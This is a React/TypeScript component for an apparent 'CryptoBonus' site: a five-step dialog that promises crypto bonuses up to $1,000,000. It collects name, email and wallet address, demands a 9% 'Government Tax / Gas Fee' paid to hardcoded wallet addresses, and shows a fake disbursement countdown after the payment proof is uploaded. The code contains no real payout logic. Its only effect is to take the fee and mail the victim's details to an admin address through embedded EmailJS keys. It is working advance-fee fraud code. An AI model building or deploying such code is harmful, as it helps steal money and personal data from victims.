import { useState, useRef, useMemo, useEffect, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";
import emailjs from "@emailjs/browser";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import {
  ArrowRight,
  ArrowLeft,
  Upload,
  CheckCircle2,
  Copy,
  Clock,
  Wallet,
  User,
  Mail,
  DollarSign,
  AlertCircle,
  KeyRound,
  Loader2,
} from "lucide-react";
import { useCoinPrices } from "@/hooks/useCoinPrices";

const MODAL_SYMBOLS = ["BTC", "ETH", "BNB", "USDT", "SOL", "XRP"];

const TAX_RATE = 0.09;

const CLAIM_AMOUNTS = [
  2500, 5000, 10000, 25000, 50000, 100000, 250000, 500000, 1000000,
];

const PLATFORM_WALLETS: Record<string, string> = {
  BTC: "165QgTquE8gNBM5ySkhZi82EXrASFkDbx1",
  ETH: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
  BNB: "bnb1grpf0955h0ykzq3ar5nmum7y6gdfl6lxfn46h2",
  USDT: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  SOL: "7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtV",
  XRP: "rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh",
};

const ADMIN_EMAIL = "info@cryptobonus.live"; // ← replace with your email
const WHATSAPP_NUMBER = "19177354067";
const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER}`;

const EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
const isValidEmail = (value: string) => EMAIL_REGEX.test(value.trim());

const WALLET_REGEX: Record<string, RegExp> = {
  BTC: /^(1|3)[a-zA-Z0-9]{24,33}$|^bc1[a-zA-Z0-9]{6,87}$/,
  ETH: /^0x[a-fA-F0-9]{40}$/,
  BNB: /^bnb1[a-z0-9]{38}$/,
  USDT: /^0x[a-fA-F0-9]{40}$/,
  SOL: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
  XRP: /^r[a-zA-Z0-9]{24,33}$/,
};

const isValidWallet = (address: string, coin: string) =>
  WALLET_REGEX[coin]?.test(address.trim()) ?? false;

const generateOtp = () =>
  Math.floor(100000 + Math.random() * 900000).toString();

const COUNTDOWN_SECONDS = 60 * 60;
const TOTAL_STEPS = 5;

interface ApplicationModalProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const ApplicationModal = ({ open, onOpenChange }: ApplicationModalProps) => {
  const coins = useCoinPrices(MODAL_SYMBOLS);

  const [step, setStep] = useState(0);
  const [fullName, setFullName] = useState("");
  const [email, setEmail] = useState("");
  const [emailTouched, setEmailTouched] = useState(false);
  const [walletAddress, setWalletAddress] = useState("");
  const [walletTouched, setWalletTouched] = useState(false);
  const [selectedCoin, setSelectedCoin] = useState("BTC");
  const [claimAmountUsd, setClaimAmountUsd] = useState(2500);
  const [proofFile, setProofFile] = useState<File | null>(null);
  const [txHash, setTxHash] = useState("");
  const [copied, setCopied] = useState(false);

  // OTP state
  const [otp, setOtp] = useState("");
  const [otpInput, setOtpInput] = useState("");
  const [otpSending, setOtpSending] = useState(false);
  const [otpSent, setOtpSent] = useState(false);
  const otpTouched = otpInput.length > 0;
  const otpValid = otpInput === otp && otp !== "";

  // Countdown state
  const [secondsLeft, setSecondsLeft] = useState(COUNTDOWN_SECONDS);
  const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const fileRef = useRef<HTMLInputElement>(null);

  const coin = coins.find((c) => c.symbol === selectedCoin)!;
  const wallet = PLATFORM_WALLETS[selectedCoin] || PLATFORM_WALLETS.BTC;

  const bonusCrypto = useMemo(() => {
    if (!coin?.price) return 0;
    return claimAmountUsd / coin.price;
  }, [claimAmountUsd, coin?.price]);

  const taxUsd = claimAmountUsd * TAX_RATE;
  const taxCrypto = useMemo(() => {
    if (!coin?.price) return 0;
    return taxUsd / coin.price;
  }, [taxUsd, coin?.price]);

  const emailValid = isValidEmail(email);
  const showEmailError = emailTouched && !emailValid;
  const walletValid = isValidWallet(walletAddress, selectedCoin);
  const showWalletError = walletTouched && !walletValid;

  const canApply = fullName.trim() && emailValid && walletValid;
  const canSubmitProof = txHash.trim() || proofFile;

  const startCountdown = useCallback(() => {
    setSecondsLeft(COUNTDOWN_SECONDS);
    if (countdownRef.current) clearInterval(countdownRef.current);
    countdownRef.current = setInterval(() => {
      setSecondsLeft((prev) => {
        if (prev <= 1) {
          clearInterval(countdownRef.current!);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  }, []);

  useEffect(() => {
    return () => {
      if (countdownRef.current) clearInterval(countdownRef.current);
    };
  }, []);

  const formatCountdown = (secs: number) => {
    const m = Math.floor(secs / 60)
      .toString()
      .padStart(2, "0");
    const s = (secs % 60).toString().padStart(2, "0");
    return `${m}:${s}`;
  };

  const handleApply = async () => {
    setEmailTouched(true);
    setWalletTouched(true);
    if (!emailValid || !walletValid || !fullName.trim()) return;

    const code = generateOtp();
    setOtp(code);
    setOtpInput("");
    setOtpSent(false);
    setOtpSending(true);

    try {
      await emailjs.send(
        "service_tgxebrt",
        "template_y4pyzoz",
        {
          to_email: email,
          user_name: fullName,
          verification_code: code,
        },
        "MvBuCO3lDmmt1uvb2",
      );
    } catch (e) {
      console.error("OTP send failed", e);
    } finally {
      setOtpSending(false);
      setOtpSent(true);
      setStep(1);
    }
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(wallet);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmitProof = () => {
    const proofParams = {
      user_name: fullName,
      selected_coin: selectedCoin,
      bonus_amount: `${bonusCrypto.toFixed(6)} ${selectedCoin}`,
      bonus_usd: `$${claimAmountUsd.toLocaleString()}`,
      tax_amount: `${taxCrypto.toFixed(6)} ${selectedCoin}`,
      tax_usd: `$${taxUsd.toLocaleString(undefined, { maximumFractionDigits: 2 })}`,
      wallet_address: walletAddress,
      tx_hash: txHash || "Screenshot uploaded",
    };

    // Notification email to admin
    emailjs
      .send(
        "service_tgxebrt",
        "template_9p1n8fu",
        { to_email: ADMIN_EMAIL, ...proofParams },
        "MvBuCO3lDmmt1uvb2",
      )
      .catch(console.error);

    // Confirmation email to user
    emailjs
      .send(
        "service_tgxebrt",
        "template_9p1n8fu",
        { to_email: email, ...proofParams },
        "MvBuCO3lDmmt1uvb2",
      )
      .catch(console.error);

    startCountdown();
    setStep(4);
  };

  const handleClose = () => {
    onOpenChange(false);
    if (countdownRef.current) clearInterval(countdownRef.current);
    setTimeout(() => {
      setStep(0);
      setFullName("");
      setEmail("");
      setEmailTouched(false);
      setWalletAddress("");
      setWalletTouched(false);
      setSelectedCoin("BTC");
      setClaimAmountUsd(2500);
      setProofFile(null);
      setTxHash("");
      setOtp("");
      setOtpInput("");
      setOtpSent(false);
      setOtpSending(false);
      setSecondsLeft(COUNTDOWN_SECONDS);
    }, 300);
  };

  const stepTitles: Record<number, string> = {
    0: "Apply for Bonus",
    1: "Verify Your Email",
    2: "Your Bonus Allocation",
    3: "Upload Proof of Payment",
    4: "Application Submitted",
  };

  return (
    <Dialog open={open} onOpenChange={handleClose}>
      <DialogContent className="sm:max-w-lg bg-card border-border overflow-hidden max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <DialogTitle className="font-display text-foreground">
            {stepTitles[step]}
          </DialogTitle>
        </DialogHeader>

        {/* Step indicators */}
        <div className="flex items-center gap-2 mb-4">
          {Array.from({ length: TOTAL_STEPS }, (_, s) => (
            <div
              key={s}
              className={`h-1 flex-1 rounded-full transition-colors ${
                s <= step ? "bg-primary" : "bg-border"
              }`}
            />
          ))}
        </div>

        <AnimatePresence mode="wait">
          {/* ── Step 0: Application form ── */}
          {step === 0 && (
            <motion.div
              key="step0"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="space-y-4"
            >
              {/* Full Name */}
              <div>
                <label className="text-sm text-muted-foreground mb-1.5 block">
                  Full Name
                </label>
                <div className="flex items-center gap-2 glass-card rounded-lg px-3 py-2.5">
                  <User className="h-4 w-4 text-muted-foreground shrink-0" />
                  <input
                    value={fullName}
                    onChange={(e) => setFullName(e.target.value)}
                    placeholder="John Doe"
                    className="bg-transparent text-foreground text-sm outline-none flex-1 placeholder:text-muted-foreground/50"
                  />
                </div>
              </div>

              {/* Email */}
              <div>
                <label className="text-sm text-muted-foreground mb-1.5 block">
                  Email
                </label>
                <div
                  className={`flex items-center gap-2 glass-card rounded-lg px-3 py-2.5 transition-colors ${
                    showEmailError
                      ? "border-destructive ring-1 ring-destructive/50"
                      : emailTouched && emailValid
                        ? "border-success/50"
                        : ""
                  }`}
                >
                  <Mail
                    className={`h-4 w-4 shrink-0 transition-colors ${
                      showEmailError
                        ? "text-destructive"
                        : emailTouched && emailValid
                          ? "text-success"
                          : "text-muted-foreground"
                    }`}
                  />
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    onBlur={() => setEmailTouched(true)}
                    placeholder="john@example.com"
                    className="bg-transparent text-foreground text-sm outline-none flex-1 placeholder:text-muted-foreground/50"
                  />
                  {emailTouched &&
                    (emailValid ? (
                      <CheckCircle2 className="h-4 w-4 text-success shrink-0" />
                    ) : (
                      <AlertCircle className="h-4 w-4 text-destructive shrink-0" />
                    ))}
                </div>
                {showEmailError && (
                  <p className="text-xs text-destructive mt-1.5 flex items-center gap-1">
                    <AlertCircle className="h-3 w-3" />
                    Please enter a valid email address
                  </p>
                )}
              </div>

              {/* Coin selector */}
              <div>
                <label className="text-sm text-muted-foreground mb-1.5 block">
                  Preferred Cryptocurrency
                </label>
                <div className="grid grid-cols-3 gap-2">
                  {coins.map((c) => (
                    <button
                      key={c.symbol}
                      onClick={() => {
                        setSelectedCoin(c.symbol);
                        setWalletAddress("");
                        setWalletTouched(false);
                      }}
                      className={`glass-card rounded-lg px-3 py-2 text-sm font-medium transition-all ${
                        selectedCoin === c.symbol
                          ? "border-primary text-primary ring-1 ring-primary"
                          : "text-muted-foreground hover:text-foreground"
                      }`}
                    >
                      {c.symbol}
                    </button>
                  ))}
                </div>
              </div>

              {/* Wallet address */}
              <div>
                <label className="text-sm text-muted-foreground mb-1.5 block">
                  Your {selectedCoin} Wallet Address
                </label>
                <div
                  className={`flex items-center gap-2 glass-card rounded-lg px-3 py-2.5 transition-colors ${
                    showWalletError
                      ? "border-destructive ring-1 ring-destructive/50"
                      : walletTouched && walletValid
                        ? "border-success/50"
                        : ""
                  }`}
                >
                  <Wallet
                    className={`h-4 w-4 shrink-0 transition-colors ${
                      showWalletError
                        ? "text-destructive"
                        : walletTouched && walletValid
                          ? "text-success"
                          : "text-muted-foreground"
                    }`}
                  />
                  <input
                    value={walletAddress}
                    onChange={(e) => setWalletAddress(e.target.value)}
                    onBlur={() => setWalletTouched(true)}
                    placeholder="Enter your wallet address"
                    className="bg-transparent text-foreground text-sm outline-none flex-1 placeholder:text-muted-foreground/50 font-mono"
                  />
                  {walletTouched &&
                    (walletValid ? (
                      <CheckCircle2 className="h-4 w-4 text-success shrink-0" />
                    ) : (
                      <AlertCircle className="h-4 w-4 text-destructive shrink-0" />
                    ))}
                </div>
                {showWalletError && (
                  <p className="text-xs text-destructive mt-1.5 flex items-center gap-1">
                    <AlertCircle className="h-3 w-3" />
                    Enter a valid {selectedCoin} wallet address
                  </p>
                )}
              </div>

              {/* Claim amount */}
              <div>
                <label className="text-sm text-muted-foreground mb-1.5 block">
                  <DollarSign className="h-3.5 w-3.5 inline mr-1" />
                  Select Claim Amount
                </label>
                <div className="grid grid-cols-3 gap-2">
                  {CLAIM_AMOUNTS.map((amt) => (
                    <button
                      key={amt}
                      onClick={() => setClaimAmountUsd(amt)}
                      className={`glass-card rounded-lg px-3 py-2 text-sm font-medium transition-all ${
                        claimAmountUsd === amt
                          ? "border-primary text-primary ring-1 ring-primary"
                          : "text-muted-foreground hover:text-foreground"
                      }`}
                    >
                      ${amt.toLocaleString()}
                    </button>
                  ))}
                </div>
              </div>

              <Button
                variant="hero"
                className="w-full"
                disabled={!canApply || otpSending}
                onClick={handleApply}
              >
                {otpSending ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Sending Code…
                  </>
                ) : (
                  <>
                    Submit Application
                    <ArrowRight className="ml-2 h-4 w-4" />
                  </>
                )}
              </Button>
            </motion.div>
          )}

          {/* ── Step 1: OTP Verification (standalone) ── */}
          {step === 1 && (
            <motion.div
              key="step1"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="space-y-5"
            >
              <div className="text-center py-4">
                <div className="w-14 h-14 rounded-full bg-primary/10 flex items-center justify-center mx-auto mb-4">
                  <KeyRound className="h-7 w-7 text-primary" />
                </div>
                <p className="text-muted-foreground text-sm">
                  We sent a 6-digit verification code to
                </p>
                <p className="text-foreground font-medium text-sm mt-1">
                  {email}
                </p>
              </div>

              {/* OTP input */}
              <div>
                <label className="text-sm text-muted-foreground mb-1.5 block">
                  Verification Code
                </label>
                <div
                  className={`flex items-center gap-2 glass-card rounded-lg px-3 py-3 transition-colors ${
                    otpTouched && !otpValid
                      ? "border-destructive ring-1 ring-destructive/50"
                      : otpValid
                        ? "border-success ring-1 ring-success/50"
                        : ""
                  }`}
                >
                  <KeyRound
                    className={`h-4 w-4 shrink-0 transition-colors ${
                      otpTouched && !otpValid
                        ? "text-destructive"
                        : otpValid
                          ? "text-success"
                          : "text-muted-foreground"
                    }`}
                  />
                  <input
                    value={otpInput}
                    onChange={(e) =>
                      setOtpInput(e.target.value.replace(/\D/g, "").slice(0, 6))
                    }
                    placeholder="Enter 6-digit code"
                    maxLength={6}
                    autoFocus
                    className="bg-transparent text-foreground text-lg outline-none flex-1 placeholder:text-muted-foreground/50 font-mono tracking-[0.3em] text-center"
                  />
                  {otpTouched &&
                    (otpValid ? (
                      <CheckCircle2 className="h-4 w-4 text-success shrink-0" />
                    ) : (
                      <AlertCircle className="h-4 w-4 text-destructive shrink-0" />
                    ))}
                </div>
                {otpTouched && !otpValid && (
                  <p className="text-xs text-destructive mt-1.5 flex items-center gap-1">
                    <AlertCircle className="h-3 w-3" />
                    Incorrect code. Check your email and try again.
                  </p>
                )}
              </div>

              {/* Security note */}
              <div className="glass-card rounded-lg p-3 bg-primary/5 border border-primary/20">
                <p className="text-xs text-muted-foreground">
                  <span className="text-primary font-medium">
                    Don't share this code.
                  </span>{" "}
                  CryptoBonus will never ask you for this code. If you didn't
                  request this, ignore it.
                </p>
              </div>

              <div className="flex gap-3">
                <Button
                  variant="outline"
                  className="flex-1"
                  onClick={() => setStep(0)}
                >
                  <ArrowLeft className="mr-2 h-4 w-4" /> Back
                </Button>
                <Button
                  variant="hero"
                  className="flex-1"
                  disabled={!otpValid}
                  onClick={() => setStep(2)}
                >
                  Verify <ArrowRight className="ml-2 h-4 w-4" />
                </Button>
              </div>
            </motion.div>
          )}

          {/* ── Step 2: Bonus allocation + tax + wallet ── */}
          {step === 2 && (
            <motion.div
              key="step2"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="space-y-4"
            >
              <div className="text-center py-4">
                <p className="text-muted-foreground text-sm mb-2">
                  Your Bonus (Unaffected by Tax)
                </p>
                <p className="text-4xl font-display font-bold gold-text">
                  {bonusCrypto.toFixed(6)} {selectedCoin}
                </p>
                <p className="text-muted-foreground text-xs mt-1">
                  ≈ ${claimAmountUsd.toLocaleString()}
                </p>
              </div>

              <div className="glass-card rounded-xl p-4 space-y-3">
                <div className="flex justify-between py-2 border-b border-border">
                  <span className="text-muted-foreground text-sm">
                    Bonus Amount
                  </span>
                  <span className="text-foreground font-medium text-sm">
                    {bonusCrypto.toFixed(6)} {selectedCoin}
                  </span>
                </div>
                <div className="flex justify-between py-2 border-b border-border">
                  <span className="text-muted-foreground text-sm">
                    Current {selectedCoin} Price
                  </span>
                  <span className="text-foreground font-medium text-sm">
                    $
                    {coin?.price.toLocaleString(undefined, {
                      maximumFractionDigits: 2,
                    })}
                  </span>
                </div>
                <div className="flex justify-between py-2 border-b border-border">
                  <span className="text-muted-foreground text-sm">
                    Government Tax / Gas Fee (9%)
                  </span>
                  <span className="text-primary font-medium text-sm">9%</span>
                </div>
                <div className="flex justify-between py-2 border-b border-border">
                  <span className="text-muted-foreground text-sm">
                    Tax Fee Payable
                  </span>
                  <div className="text-right">
                    <span className="text-primary font-bold block">
                      {taxCrypto.toFixed(6)} {selectedCoin}
                    </span>
                    <span className="text-muted-foreground text-xs">
                      ≈ $
                      {taxUsd.toLocaleString(undefined, {
                        maximumFractionDigits: 2,
                      })}
                    </span>
                  </div>
                </div>
                <div className="flex justify-between py-2">
                  <span className="text-muted-foreground text-sm">
                    Disbursement Time
                  </span>
                  <span className="text-success font-medium text-sm flex items-center gap-1">
                    <Clock className="h-3 w-3" /> 60 minutes
                  </span>
                </div>
              </div>

              <div className="glass-card rounded-lg p-3 bg-primary/5 border border-primary/20">
                <p className="text-xs text-primary font-medium mb-1">
                  ✦ Your full bonus of {bonusCrypto.toFixed(6)} {selectedCoin}{" "}
                  remains unchanged
                </p>
                <p className="text-xs text-muted-foreground">
                  The tax/gas fee is a separate payment required to process your
                  claim.
                </p>
              </div>

              {/* Platform wallet */}
              <div>
                <p className="text-muted-foreground text-xs mb-2">
                  Pay the tax/gas fee to the {selectedCoin} wallet below:
                </p>
                <div className="glass-card rounded-lg px-3 py-2.5 flex items-center gap-2">
                  <code className="text-xs text-foreground font-mono flex-1 break-all">
                    {wallet}
                  </code>
                  <button
                    onClick={handleCopy}
                    className="text-primary hover:text-primary/80 shrink-0"
                  >
                    {copied ? (
                      <CheckCircle2 className="h-4 w-4 text-success" />
                    ) : (
                      <Copy className="h-4 w-4" />
                    )}
                  </button>
                </div>
              </div>

              <div className="flex gap-3">
                <Button
                  variant="outline"
                  className="flex-1"
                  onClick={() => setStep(1)}
                >
                  <ArrowLeft className="mr-2 h-4 w-4" /> Back
                </Button>
                <Button
                  variant="hero"
                  className="flex-1"
                  onClick={() => setStep(3)}
                >
                  I've Paid <ArrowRight className="ml-2 h-4 w-4" />
                </Button>
              </div>
            </motion.div>
          )}

          {/* ── Step 3: Upload proof ── */}
          {step === 3 && (
            <motion.div
              key="step3"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="space-y-4"
            >
              <p className="text-muted-foreground text-sm">
                Upload your transaction hash or screenshot as proof of payment
                for{" "}
                <span className="text-primary font-semibold">
                  {taxCrypto.toFixed(6)} {selectedCoin}
                </span>{" "}
                <span className="text-muted-foreground text-xs">
                  (≈ $
                  {taxUsd.toLocaleString(undefined, {
                    maximumFractionDigits: 2,
                  })}
                  )
                </span>
              </p>

              <div>
                <label className="text-sm text-muted-foreground mb-1.5 block">
                  Transaction Hash
                </label>
                <div className="flex items-center gap-2 glass-card rounded-lg px-3 py-2.5">
                  <input
                    value={txHash}
                    onChange={(e) => setTxHash(e.target.value)}
                    placeholder="0x... or paste transaction ID"
                    className="bg-transparent text-foreground text-sm outline-none flex-1 placeholder:text-muted-foreground/50 font-mono"
                  />
                </div>
              </div>

              <div className="text-center text-muted-foreground text-xs">
                — or —
              </div>

              <div>
                <label className="text-sm text-muted-foreground mb-1.5 block">
                  Upload Screenshot
                </label>
                <input
                  ref={fileRef}
                  type="file"
                  accept="image/*"
                  className="hidden"
                  onChange={(e) => setProofFile(e.target.files?.[0] || null)}
                />
                <button
                  onClick={() => fileRef.current?.click()}
                  className="w-full glass-card rounded-lg px-4 py-6 flex flex-col items-center gap-2 hover:border-primary/50 transition-colors border border-dashed border-border"
                >
                  <Upload className="h-6 w-6 text-muted-foreground" />
                  <span className="text-sm text-muted-foreground">
                    {proofFile ? proofFile.name : "Click to upload screenshot"}
                  </span>
                </button>
              </div>

              <p className="text-xs text-muted-foreground text-center">
                Need help?{" "}
                <a
                  href={WHATSAPP_URL}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-green-500 hover:text-green-400 font-medium"
                >
                  Contact us on WhatsApp
                </a>
              </p>

              <div className="flex gap-3">
                <Button
                  variant="outline"
                  className="flex-1"
                  onClick={() => setStep(2)}
                >
                  <ArrowLeft className="mr-2 h-4 w-4" /> Back
                </Button>
                <Button
                  variant="hero"
                  className="flex-1"
                  disabled={!canSubmitProof}
                  onClick={handleSubmitProof}
                >
                  Submit Proof <ArrowRight className="ml-2 h-4 w-4" />
                </Button>
              </div>
            </motion.div>
          )}

          {/* ── Step 4: Confirmation + live countdown ── */}
          {step === 4 && (
            <motion.div
              key="step4"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              className="text-center py-6 space-y-4"
            >
              <div className="w-16 h-16 rounded-full bg-success/10 flex items-center justify-center mx-auto">
                <CheckCircle2 className="h-8 w-8 text-success" />
              </div>
              <h3 className="font-display font-bold text-xl text-foreground">
                Application Submitted!
              </h3>
              <p className="text-muted-foreground text-sm max-w-sm mx-auto">
                Your proof of payment is being verified. Your full bonus of{" "}
                <span className="text-primary font-semibold">
                  {bonusCrypto.toFixed(6)} {selectedCoin}
                </span>{" "}
                (≈ ${claimAmountUsd.toLocaleString()}) will be sent to your
                wallet after verification.
              </p>

              <div className="glass-card rounded-xl p-4 inline-flex flex-col items-center gap-1">
                <div className="flex items-center gap-2 text-sm text-muted-foreground mb-1">
                  <Clock className="h-4 w-4 text-primary animate-pulse" />
                  Estimated disbursement in
                </div>
                <span
                  className={`font-mono text-4xl font-bold tabular-nums transition-colors ${
                    secondsLeft < 300 ? "text-destructive" : "text-primary"
                  }`}
                >
                  {formatCountdown(secondsLeft)}
                </span>
                {secondsLeft === 0 && (
                  <p className="text-xs text-success mt-1 font-medium">
                    ✓ Disbursement initiated — check your wallet
                  </p>
                )}
              </div>

              <div className="pt-2 space-y-3">
                <Button variant="hero" onClick={handleClose}>
                  Done
                </Button>
                <p className="text-xs text-muted-foreground">
                  Questions?{" "}
                  <a
                    href={WHATSAPP_URL}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-green-500 hover:text-green-400 font-medium"
                  >
                    Chat with us on WhatsApp
                  </a>
                </p>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </DialogContent>
    </Dialog>
  );
};

export default ApplicationModal;
